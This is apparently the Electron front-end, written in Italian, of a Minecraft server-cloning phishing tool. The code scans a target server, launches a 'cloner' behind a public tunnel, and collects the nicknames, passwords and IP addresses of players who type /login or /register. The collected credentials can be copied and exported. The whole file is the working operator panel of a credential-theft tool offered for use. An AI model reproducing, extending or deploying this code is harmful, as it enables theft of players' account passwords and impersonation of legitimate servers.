const { ipcRenderer } = require('electron');

class CredentialLoggerUI {
    constructor() {
        this.isRunning = false;
        this.startTime = null;
        this.uptimeInterval = null;
        this.credentialsData = { credentials: [], stats: { total: 0, unique_users: 0, connections: 0 } };
        this.lastCredentialsCount = 0;
        
        this.init();
    }

    init() {
        this.setupEventListeners();
        this.setupIPCListeners();
        this.startClock();
        this.loadCredentials();
        this.updateUI();
    }

    setupEventListeners() {
        // Title bar controls
        document.getElementById('minimizeBtn').addEventListener('click', () => {
            ipcRenderer.invoke('window-minimize');
        });

        document.getElementById('maximizeBtn').addEventListener('click', () => {
            ipcRenderer.invoke('window-maximize');
        });

        document.getElementById('closeBtn').addEventListener('click', () => {
            ipcRenderer.invoke('window-close');
        });

        // Main controls
        document.getElementById('scanBtn').addEventListener('click', () => {
            this.scanServer();
        });

        document.getElementById('startBtn').addEventListener('click', () => {
            this.startCloner();
        });

        document.getElementById('stopBtn').addEventListener('click', () => {
            this.stopCloner();
        });

        // Tab navigation
        document.querySelectorAll('.tab').forEach(tab => {
            tab.addEventListener('click', () => {
                this.switchTab(tab.dataset.tab);
            });
        });

        // Console controls
        document.getElementById('clearConsoleBtn').addEventListener('click', () => {
            this.clearConsole();
        });

        // Credentials controls
        document.getElementById('clearCredsBtn').addEventListener('click', () => {
            this.clearCredentials();
        });

        document.getElementById('exportCredsBtn').addEventListener('click', () => {
            this.exportCredentials();
        });

        document.getElementById('refreshCredsBtn').addEventListener('click', () => {
            this.loadCredentials();
        });

        document.getElementById('testCredsBtn').addEventListener('click', () => {
            this.testCredentialSystem();
        });

        // Copy URL
        document.getElementById('copyUrlBtn').addEventListener('click', () => {
            this.copyPublicUrl();
        });

        // Enter key on inputs
        document.getElementById('serverHost').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') this.scanServer();
        });

        document.getElementById('serverPort').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') this.scanServer();
        });
    }

    setupIPCListeners() {
        // Console output
        ipcRenderer.on('cloner-output', (event, output) => {
            this.addConsoleMessage(output, 'info');
        });

        ipcRenderer.on('cloner-error', (event, error) => {
            this.addConsoleMessage(error, 'error');
        });

        ipcRenderer.on('cloner-stopped', (event, code) => {
            this.handleClonerStopped(code);
        });

        // Status updates
        ipcRenderer.on('server-status', (event, status) => {
            this.updateServerStatus(status);
        });

        ipcRenderer.on('tunnel-status', (event, status) => {
            this.updateTunnelStatus(status);
        });

        ipcRenderer.on('public-url', (event, url) => {
            this.updatePublicUrl(url);
        });

        // Aggiornamenti info server
        ipcRenderer.on('server-info-update', (event, info) => {
            if (info.version) {
                document.getElementById('serverVersion').textContent = info.version;
            }
            if (info.players) {
                document.getElementById('serverPlayers').textContent = info.players;
            }
        });

        // Aggiornamento credenziali automatico
        ipcRenderer.on('credentials-updated', () => {
            console.log('🔄 Aggiornamento credenziali rilevato');
            this.loadCredentialsSmooth();
        });

        // Auto-refresh intelligente solo quando necessario
        this.lastCredentialsCount = 0;
        setInterval(() => {
            if (this.isRunning && document.querySelector('.tab[data-tab="credentials"]').classList.contains('active')) {
                this.checkCredentialsUpdate();
            }
        }, 5000); // Ogni 5 secondi e solo se il tab è attivo
    }

    async scanServer() {
        const host = document.getElementById('serverHost').value.trim();
        const port = parseInt(document.getElementById('serverPort').value) || 25565;

        if (!host) {
            this.showNotification('Inserisci un host server', 'error');
            return;
        }

        this.showLoading('Scansione server in corso...');
        this.addConsoleMessage(`🔍 Scansione server: ${host}:${port}`, 'info');

        try {
            const serverInfo = await ipcRenderer.invoke('get-server-info', host, port);
            
            if (serverInfo.error) {
                this.addConsoleMessage(`❌ Errore scansione: ${serverInfo.error}`, 'error');
                this.updateServerInfo('Errore', '-', '-');
            } else {
                const version = serverInfo.version?.name || serverInfo.version || 'Sconosciuta';
                const players = serverInfo.players ? 
                    `${serverInfo.players.online || 0}/${serverInfo.players.max || 0}` : '0/0';
                
                this.addConsoleMessage(`✅ Server rilevato: ${version}`, 'success');
                this.addConsoleMessage(`👥 Giocatori: ${players}`, 'info');
                this.updateServerInfo('Online', version, players);
            }
        } catch (error) {
            this.addConsoleMessage(`❌ Errore scansione: ${error.message}`, 'error');
            this.updateServerInfo('Errore', '-', '-');
        }

        this.hideLoading();
    }

    async startCloner() {
        const host = document.getElementById('serverHost').value.trim();
        const port = parseInt(document.getElementById('serverPort').value) || 25565;

        if (!host) {
            this.showNotification('Inserisci un host server', 'error');
            return;
        }

        this.showLoading('Avvio cloner...');
        this.addConsoleMessage(`🚀 Avvio cloner per ${host}:${port}`, 'info');

        try {
            const result = await ipcRenderer.invoke('start-cloner', host, port);
            
            if (result.success) {
                this.isRunning = true;
                this.startTime = Date.now();
                this.startUptimeCounter();
                this.updateControlsState();
                this.updateStatusIndicator('active', 'Cloner attivo');
                this.addConsoleMessage('✅ Cloner avviato con successo', 'success');
            } else {
                this.addConsoleMessage(`❌ Errore avvio: ${result.message}`, 'error');
            }
        } catch (error) {
            this.addConsoleMessage(`❌ Errore avvio: ${error.message}`, 'error');
        }

        this.hideLoading();
    }

    async stopCloner() {
        this.showLoading('Arresto cloner...');
        this.addConsoleMessage('🛑 Arresto cloner...', 'warning');

        try {
            const result = await ipcRenderer.invoke('stop-cloner');
            
            if (result.success) {
                this.handleClonerStopped(0);
                this.addConsoleMessage('✅ Cloner fermato', 'success');
            } else {
                this.addConsoleMessage(`❌ Errore arresto: ${result.message}`, 'error');
            }
        } catch (error) {
            this.addConsoleMessage(`❌ Errore arresto: ${error.message}`, 'error');
        }

        this.hideLoading();
    }

    handleClonerStopped(code) {
        this.isRunning = false;
        this.startTime = null;
        this.stopUptimeCounter();
        this.updateControlsState();
        this.updateStatusIndicator('inactive', 'Pronto');
        this.updateServerInfo('Non connesso', '-', '-');
        this.updateTunnelStatus('Inattivo');
        this.updatePublicUrl('');
    }

    switchTab(tabName) {
        // Update tab buttons
        document.querySelectorAll('.tab').forEach(tab => {
            tab.classList.remove('active');
        });
        document.querySelector(`[data-tab="${tabName}"]`).classList.add('active');

        // Update tab content
        document.querySelectorAll('.tab-content').forEach(content => {
            content.classList.remove('active');
        });
        document.getElementById(`${tabName}Tab`).classList.add('active');

        // Refresh data if needed (solo se non è già caricato)
        if (tabName === 'credentials' && this.lastCredentialsCount === 0) {
            this.loadCredentials();
        }
    }

    addConsoleMessage(message, type = 'info') {
        const console = document.getElementById('console');
        const line = document.createElement('div');
        line.className = `console-line ${type}`;
        
        const timestamp = document.createElement('span');
        timestamp.className = 'timestamp';
        timestamp.textContent = `[${new Date().toLocaleTimeString()}]`;
        
        const msg = document.createElement('span');
        msg.className = 'message';
        msg.textContent = message;
        
        line.appendChild(timestamp);
        line.appendChild(msg);
        console.appendChild(line);
        
        // Auto scroll to bottom
        console.scrollTop = console.scrollHeight;
        
        // Limit console lines
        const lines = console.querySelectorAll('.console-line');
        if (lines.length > 1000) {
            lines[0].remove();
        }
    }

    clearConsole() {
        const console = document.getElementById('console');
        console.innerHTML = `
            <div class="console-line welcome">
                <span class="timestamp">[SISTEMA]</span>
                <span class="message">🎯 Console pulita</span>
            </div>
        `;
    }

    async loadCredentials() {
        try {
            this.credentialsData = await ipcRenderer.invoke('get-credentials');
            this.renderCredentials();
            this.updateStats();
            this.lastCredentialsCount = this.credentialsData.credentials.length;
        } catch (error) {
            this.addConsoleMessage(`❌ Errore caricamento credenziali: ${error.message}`, 'error');
        }
    }

    // Caricamento smooth senza effetto "balla"
    async loadCredentialsSmooth() {
        try {
            const newData = await ipcRenderer.invoke('get-credentials');
            
            // Solo se ci sono davvero nuove credenziali
            if (newData.credentials.length !== this.lastCredentialsCount) {
                this.credentialsData = newData;
                this.renderCredentials();
                this.updateStats();
                this.lastCredentialsCount = newData.credentials.length;
            }
        } catch (error) {
            console.log('Errore aggiornamento smooth:', error.message);
        }
    }

    // Controllo intelligente per aggiornamenti
    async checkCredentialsUpdate() {
        try {
            const data = await ipcRenderer.invoke('get-credentials');
            if (data.credentials.length !== this.lastCredentialsCount) {
                this.loadCredentialsSmooth();
            }
        } catch (error) {
            // Ignora errori silenziosi
        }
    }

    renderCredentials() {
        const container = document.getElementById('credentialsContainer');
        
        if (!this.credentialsData.credentials || this.credentialsData.credentials.length === 0) {
            container.innerHTML = `
                <div class="no-data">
                    <i class="fas fa-key"></i>
                    <p>Nessuna credenziale catturata</p>
                    <small>Le credenziali appariranno qui quando i giocatori useranno /login o /register</small>
                </div>
            `;
            return;
        }

        container.innerHTML = '';
        
        this.credentialsData.credentials.forEach(cred => {
            const item = document.createElement('div');
            item.className = 'credential-item';
            
            // Determina il tipo di credenziale per il colore
            const credType = cred.type || 'unknown';
            const isLogin = credType.includes('login');
            const isRegister = credType.includes('register');
            
            // Mostra solo credenziali con password (non connessioni)
            if (!cred.password && credType === 'connection') {
                return;
            }
            
            const nickname = cred.nickname || cred.username || 'Sconosciuto';
            const serverOriginal = cred.server_original || cred.server || 'N/A';
            const clientIp = cred.client_ip || cred.ip || 'N/A';
            const dateTime = cred.date && cred.time ? `${cred.date} ${cred.time}` : new Date(cred.timestamp).toLocaleString('it-IT');
            
            item.innerHTML = `
                <div class="credential-header">
                    <span class="credential-user ${isLogin ? 'login-type' : 'register-type'}">${nickname}</span>
                    <span class="credential-time">${dateTime}</span>
                </div>
                <div class="credential-details">
                    <div class="credential-field">
                        <div class="field-label">Nickname</div>
                        <div class="field-value-with-copy">
                            <div class="field-value">${nickname}</div>
                            <button class="copy-btn" data-copy="${nickname}" title="Copia Nickname">
                                <i class="fas fa-copy"></i>
                            </button>
                        </div>
                    </div>
                    <div class="credential-field">
                        <div class="field-label">Password</div>
                        <div class="field-value-with-copy">
                            <div class="field-value password-field">${cred.password || 'N/A'}</div>
                            <button class="copy-btn copy-btn-password" data-copy="${cred.password || ''}" title="Copia Password">
                                <i class="fas fa-copy"></i>
                            </button>
                        </div>
                    </div>
                    <div class="credential-field">
                        <div class="field-label">Server Originale</div>
                        <div class="field-value-with-copy">
                            <div class="field-value">${serverOriginal}</div>
                            <button class="copy-btn copy-btn-server" data-copy="${serverOriginal}" title="Copia Server">
                                <i class="fas fa-copy"></i>
                            </button>
                        </div>
                    </div>
                    <div class="credential-field">
                        <div class="field-label">IP Client</div>
                        <div class="field-value">${clientIp}</div>
                    </div>
                    <div class="credential-field">
                        <div class="field-label">Tipo</div>
                        <div class="field-value">${isLogin ? '🔑 Login' : '📝 Register'}</div>
                    </div>
                    <div class="credential-field">
                        <div class="field-label">Comando</div>
                        <div class="field-value command-field">${cred.command || 'N/A'}</div>
                    </div>
                </div>
            `;
            
            container.appendChild(item);
        });

        // Aggiungi event listeners per i pulsanti di copia
        this.setupCopyButtons();
    }

    async clearCredentials() {
        if (confirm('Sei sicuro di voler cancellare tutte le credenziali?')) {
            try {
                const result = await ipcRenderer.invoke('clear-credentials');
                if (result.success) {
                    this.loadCredentials();
                    this.addConsoleMessage('✅ Credenziali cancellate', 'success');
                } else {
                    this.addConsoleMessage(`❌ Errore: ${result.message}`, 'error');
                }
            } catch (error) {
                this.addConsoleMessage(`❌ Errore: ${error.message}`, 'error');
            }
        }
    }

    async exportCredentials() {
        try {
            const result = await ipcRenderer.invoke('export-credentials');
            if (result.success) {
                this.addConsoleMessage('✅ Credenziali esportate', 'success');
            } else {
                this.addConsoleMessage(`❌ Errore esportazione: ${result.message}`, 'error');
            }
        } catch (error) {
            this.addConsoleMessage(`❌ Errore esportazione: ${error.message}`, 'error');
        }
    }

    updateStats() {
        const stats = this.credentialsData.stats || {};
        
        document.getElementById('totalConnections').textContent = stats.connections || 0;
        document.getElementById('totalCredentials').textContent = stats.total || 0;
        document.getElementById('uniqueUsers').textContent = stats.unique_users || 0;
    }

    updateServerInfo(status, version, players) {
        document.getElementById('serverStatus').textContent = status;
        document.getElementById('serverVersion').textContent = version;
        document.getElementById('serverPlayers').textContent = players;
    }

    updateServerStatus(status) {
        const statusElement = document.getElementById('serverStatus');
        if (status === 'connected') {
            statusElement.textContent = 'Connesso';
            statusElement.style.color = 'var(--success)';
        }
    }

    updateTunnelStatus(status) {
        const tunnelElement = document.getElementById('tunnelStatus');
        if (status === 'active') {
            tunnelElement.textContent = 'Attivo';
            tunnelElement.style.color = 'var(--success)';
        } else {
            tunnelElement.textContent = 'Inattivo';
            tunnelElement.style.color = 'var(--text-muted)';
        }
    }

    updatePublicUrl(url) {
        const urlInput = document.getElementById('publicUrl');
        urlInput.value = url || 'Nessun tunnel attivo';
        
        const copyBtn = document.getElementById('copyUrlBtn');
        copyBtn.disabled = !url;
    }

    copyPublicUrl() {
        const urlInput = document.getElementById('publicUrl');
        if (urlInput.value && urlInput.value !== 'Nessun tunnel attivo') {
            navigator.clipboard.writeText(urlInput.value).then(() => {
                this.showNotification('URL copiato negli appunti', 'success');
            });
        }
    }

    updateControlsState() {
        const startBtn = document.getElementById('startBtn');
        const stopBtn = document.getElementById('stopBtn');
        
        startBtn.disabled = this.isRunning;
        stopBtn.disabled = !this.isRunning;
    }

    updateStatusIndicator(status, text) {
        const indicator = document.getElementById('statusIndicator');
        const statusText = document.getElementById('statusText');
        
        indicator.className = `status-indicator ${status}`;
        statusText.textContent = text;
    }

    startUptimeCounter() {
        this.uptimeInterval = setInterval(() => {
            if (this.startTime) {
                const uptime = Date.now() - this.startTime;
                const hours = Math.floor(uptime / 3600000);
                const minutes = Math.floor((uptime % 3600000) / 60000);
                const seconds = Math.floor((uptime % 60000) / 1000);
                
                document.getElementById('uptime').textContent = 
                    `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
            }
        }, 1000);
    }

    stopUptimeCounter() {
        if (this.uptimeInterval) {
            clearInterval(this.uptimeInterval);
            this.uptimeInterval = null;
        }
        document.getElementById('uptime').textContent = '00:00:00';
    }

    startClock() {
        const updateTime = () => {
            document.getElementById('timeDisplay').textContent = new Date().toLocaleTimeString();
        };
        
        updateTime();
        setInterval(updateTime, 1000);
    }

    showLoading(text) {
        document.getElementById('loadingText').textContent = text;
        document.getElementById('loadingOverlay').classList.add('show');
    }

    hideLoading() {
        document.getElementById('loadingOverlay').classList.remove('show');
    }

    showNotification(message, type = 'info') {
        this.addConsoleMessage(message, type);
        
        // Could add toast notifications here in the future
    }

    updateUI() {
        this.updateControlsState();
        this.updateStatusIndicator('inactive', 'Pronto');
    }

    setupCopyButtons() {
        // Rimuovi event listeners esistenti per evitare duplicati
        document.querySelectorAll('.copy-btn').forEach(btn => {
            btn.removeEventListener('click', this.handleCopy);
        });

        // Aggiungi nuovi event listeners
        document.querySelectorAll('.copy-btn').forEach(btn => {
            btn.addEventListener('click', this.handleCopy.bind(this));
        });
    }

    async handleCopy(event) {
        const btn = event.currentTarget;
        const textToCopy = btn.getAttribute('data-copy');
        
        if (!textToCopy || textToCopy === 'N/A') {
            this.showNotification('Nessun testo da copiare', 'warning');
            return;
        }

        try {
            await navigator.clipboard.writeText(textToCopy);
            
            // Feedback visivo
            const originalIcon = btn.innerHTML;
            btn.innerHTML = '<i class="fas fa-check"></i>';
            btn.style.background = '#4caf50';
            
            setTimeout(() => {
                btn.innerHTML = originalIcon;
                btn.style.background = '';
            }, 1000);
            
            this.showNotification(`Copiato: ${textToCopy}`, 'success');
            
        } catch (error) {
            this.showNotification('Errore nella copia', 'error');
        }
    }

    // Funzione di test per verificare il sistema credenziali
    testCredentialSystem() {
        // Simula una credenziale di test
        const testCred = {
            timestamp: new Date().toISOString(),
            username: 'TestUser123',
            password: 'TestPassword456',
            command: '/login TestUser123 TestPassword456',
            type: 'login_test',
            ip: '127.0.0.1'
        };

        // Aggiungi alla lista locale per test
        if (!this.credentialsData.credentials) {
            this.credentialsData.credentials = [];
        }
        
        this.credentialsData.credentials.unshift(testCred);
        this.credentialsData.stats.total = this.credentialsData.credentials.length;
        
        this.renderCredentials();
        this.updateStats();
        
        this.addConsoleMessage('🧪 Credenziale di test aggiunta', 'warning');
        this.showNotification('Sistema credenziali testato con successo!', 'success');
    }
}

// Initialize the app when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    new CredentialLoggerUI();
});